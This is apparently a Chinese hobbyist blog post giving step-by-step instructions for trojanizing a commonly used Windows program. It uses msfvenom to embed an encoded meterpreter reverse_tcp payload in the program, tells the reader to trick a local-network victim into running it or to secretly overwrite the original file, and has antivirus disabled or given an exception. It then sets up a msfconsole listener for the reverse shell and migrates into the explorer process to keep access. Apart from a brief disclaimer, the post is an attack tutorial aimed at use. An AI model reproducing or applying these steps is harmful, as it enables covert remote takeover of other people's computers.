---
layout: post
title: 制造含有连接会话的木马软件来攻击Windows
tags: linux windows
---

### 前言

哈喽大家好。我又好久没更新博客了。

前一段时间我的电脑被我爸移到~~其他地方~~办公室去了。好端端的为什么会移到办公室呢？我也不知道...

然后我去插那边的网线，结果插上是插上了，电脑上也写着连接了，有因特访问。可是我进百度却进半天都没进去，竟然还连接超时，气死我了。

我请人看了，说是我电脑的问题，叫我装双系统。OK，装了还是没用啊啊啊

不过现在没事了，我用上了WIFI网卡。
  
### 准备材料

- Kali电脑一台

- 没装防火墙和360卫士或防火墙不稳定的电脑一部

  - 搭载WinXP或Win7

  - 可以是笔记本或台式机

### 开始前

我们要利用一些我们很常见的一些软件，然后把连接会话藏到这些软件里面，来达到攻击的效果。这就是为什么在那些2008、2009年时说的“不要下载网站上未知来源的东西”。

但现在我们有了360安全卫士啊，电脑管家啊，那些杀毒软件就变得安全多了。对于我来讲，This is a LITTLE problem。

But anyways，我们关掉那台Xp的杀毒软件就行了鸭［滑稽]。

**注意！该教程仅用于学习，不可用于违法等行为！如有问题本人不负责！**

### 01.编译软件

我们先找找，有什么程序是我们经常用的（或者是被攻击机的机主经常用的），比如，浏览器？office？

先提取机主经常使用的软件的主程序（也就是快捷程序所指向的主程序）。

然后把它发送到kali主机（攻击机）上，这里建议放在`~/`。

然后在kali命令行里输入这段命令:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=%你kali机器ip网址是啥来着% LPORT=4444 -x %那个主程序的文件名% -e x86/jmp_call_additive -i 4 -k -f exe > %新的文件名%
```

`LHOST=`后面接你的ip网址

`LPORT`是指你的Kali电脑的端口。随情况而定

`-x`是指那个主程序的名字，如果你的命令行的指向定位是在`~/`则寻找在同一个目录的文件。

`>`后面可以稍微更改一下文件名和保存的路径，比如之前主程序是在`~/wechat.exe`，则可以更改为`~/Document/wechat.exe`。为了不被之前的文件覆盖，建议更改目录。

以上命令根据源进行修改和添加。

### 02.打开或修改

把生成完成的文件发给在同一个局域网的用户（而且要确定这个受害者的IP地址是固定的要不然会出现攻击了其他人ww），并指示受害者打开。前提是要关掉杀毒软件。

或者是趁人不在的时候修改覆盖掉原来的文件。（如果安装了杀毒软件的话要添加例外）

否则..

![]({{ site.imgbed }}/img/kalihack/06.png)

### 03.设置内容并等待受害者打开文件

差不多了！回到你的Kali电脑前然后打开Msfconsole，按照以下内容输入命令==

```msf
use exploit/multi/handler
//表示使用活动指向的监听器

set LHOST 192.106.12.175
//设置本机ip

set LPORT 4444
//设置本机端口

set payload windows/meterpreter/reverse_tcp
//设置载荷为*比较开放的tcp*

exploit
//开启监听
```

注意，受害者打开所谓的应用后你才会开启监听进入`meterpreter`命令提示符的shell。

如果受害者使用完应用后可能会关闭。关闭后，你将无法继续使用`meterpreter`。怎么办呢？我们需要**注入进程**！

### 注入进程

在进入`meterpreter`提示符后输入

```msf
ps
```

来查看进程，注意一个进程为`explorer`的内容，记下它的`pid号`。

![]({{ site.imgbed }}/img/kalihack/07.png)

![]({{ site.imgbed }}/img/kalihack/08.png)

这里，`explorer`的*pid*是`4560`.

融进`explorer`！

![]({{ site.imgbed }}/img/kalihack/09.png)
